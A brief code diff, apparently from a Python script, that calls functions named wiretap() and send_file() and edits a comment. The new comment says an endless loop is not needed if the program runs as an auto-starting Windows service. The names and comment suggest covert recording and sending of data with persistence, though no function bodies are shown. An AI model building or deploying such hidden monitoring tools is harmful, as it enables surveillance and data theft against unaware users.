@@ -73,6 +73,6 @@ def send_file():
 wiretap()
 send_file()
 
-'''while True: # to make it not close after sending
+'''while True: # to make it not close after sending. not needed if you'll make this program an auto-running Win service
     wiretap()
     send_file()'''
